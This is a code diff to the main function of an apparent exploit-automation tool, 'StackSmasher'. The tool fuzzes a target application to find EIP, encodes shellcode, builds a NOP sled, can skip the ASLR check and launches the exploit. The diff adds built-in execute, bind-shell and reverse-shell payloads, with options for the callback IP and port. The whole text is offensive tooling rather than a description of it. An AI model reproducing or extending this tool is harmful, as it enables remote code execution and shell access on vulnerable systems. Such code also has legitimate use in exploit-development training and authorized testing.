@@ -3,6 +3,9 @@
 #include "argparse.hpp"
 #include "Log/Log.hpp"
 #include "Utility/Filesystem/File.hpp"
+#include "Payloads/Execute/Execute.hpp"
+#include "Payloads/BindShell/BindShell.hpp"
+#include "Payloads/ReverseShell/ReverseShell.hpp"
 #include "Encoder/XorEncoder.hpp"
 #include "Stages/Fuzzer/Fuzzer.hpp"
 #include "Stages/BadCharacters/BadCharacters.hpp"
@@ -12,14 +15,24 @@ int main(int argc, char* argv[])
     // Arguments
     argparse::ArgumentParser program("StackSmasher", "1.0.0");
     program.add_argument("application").help("The target application being tested");
-    program.add_argument("-p", "--payload").help("The binary payload file to be sent").nargs(1).default_value(std::string("payloads/sh.bin"));
-    program.add_argument("-v", "--verbose").help("Verbosity level: 0-4").nargs(1).default_value(1).action([](const std::string& value) { return std::stoi(value); });
-    program.add_argument("-n", "--nops").help("The number of NOPs to put in the NOP sled before the shell").nargs(1).default_value(20).action([](const std::string& value) { return std::stoi(value); });
-    program.add_argument("-q", "--quiet").help("Do not print the start header").default_value(false).implicit_value(true);
-    program.add_argument("-e", "--exploit").help("Automatically run the full payload against the application").default_value(false).implicit_value(true);
-    program.add_argument("--python").help("Print the exploit as a python script").default_value(false).implicit_value(true);
-    program.add_argument("--skip-aslr-check").help("Skip checking if ASLR is enabled and proceed anyway").default_value(false).implicit_value(true);
-    program.add_argument("--skip-encoding").help("Skip encoding the payload and checking bad characters").default_value(false).implicit_value(true);
+    program.add_argument("-p", "--payload").help("The built-in payload to use. [execute, bind-shell, reverse-shell]").nargs(1).default_value(std::string("execute")).action([](const std::string& value) {
+        static const std::vector<std::string> choices = { "execute", "bind-shell", "reverse-shell" };
+        if (std::find(choices.begin(), choices.end(), value) != choices.end()) {
+            return value;
+        }
+        return std::string("sh");
+    });
+    program.add_argument("-pf", "--payload-file").help("The binary payload file to be sent instead of built-in payload.").nargs(1).default_value(std::string(""));
+    program.add_argument("-v", "--verbose").help("Verbosity level: 0-4.").nargs(1).default_value(1).action([](const std::string& value) { return std::stoi(value); });
+    program.add_argument("-n", "--nops").help("The number of NOPs to put in the NOP sled before the shell.").nargs(1).default_value(20).action([](const std::string& value) { return std::stoi(value); });
+    program.add_argument("-q", "--quiet").help("Do not print the start header.").default_value(false).implicit_value(true);
+    program.add_argument("-e", "--exploit").help("Automatically run the full payload against the application.").default_value(false).implicit_value(true);
+    program.add_argument("--python").help("Print the exploit as a python script.").default_value(false).implicit_value(true);
+    program.add_argument("--binary").help("The binary the application should execute if a built-in payload is selected.").nargs(1).default_value(std::string("/bin/sh"));
+    program.add_argument("--shell-ip").help("The IP address a reverse shell should connect to.").nargs(1).default_value(std::string("127.0.0.1"));
+    program.add_argument("--shell-port").help("The port number a bind shoud listen on or a reverse shell should connect to.").nargs(1).default_value(1337).action([](const std::string& value) { return std::stoi(value); });
+    program.add_argument("--skip-aslr-check").help("Skip checking if ASLR is enabled and proceed anyway.").default_value(false).implicit_value(true);
+    program.add_argument("--skip-encoding").help("Skip encoding the payload and checking bad characters.").default_value(false).implicit_value(true);
     program.add_argument("--no-colour").help("Do not output ANSI escape codes to show colours.").default_value(false).implicit_value(true);
 
     // Argument Parsing
@@ -55,14 +68,32 @@ int main(int argc, char* argv[])
         return 3;
     }
 
-    // Read payload
+    // Payload variables
     std::string shell = "";
     size_t rawPayloadSize = 0;
-    uint8_t* rawPayload = File::readAllBytes(program.get<std::string>("--payload"), &rawPayloadSize);
-    if (rawPayload == nullptr)
+    uint8_t* rawPayload = nullptr;
+
+    // Read payload from file
+    std::string payloadFile = program.get<std::string>("--payload-file");
+    if (!payloadFile.empty())
     {
-        Log::error(VerbosityLevel::Standard, "Failed to read the payload file.\n");
-        return 4;
+        rawPayload = File::readAllBytes(program.get<std::string>("--payload-file"), &rawPayloadSize);
+        if (rawPayload == nullptr)
+        {
+            Log::error(VerbosityLevel::Standard, "Failed to read the payload file.\n");
+            return 4;
+        }
+    }
+    else
+    {
+        // Get built-in payload
+        std::string payloadType = program.get<std::string>("--payload");
+        if (payloadType == "execute")
+            rawPayload = Execute::getPayload(&rawPayloadSize, program);
+        else if (payloadType == "reverse-shell")
+            rawPayload = ReverseShell::getPayload(&rawPayloadSize, program);
+        else if (payloadType == "bind-shell")
+            rawPayload = BindShell::getPayload(&rawPayloadSize, program);
     }
 
     // Run the fuzzer to find EIP
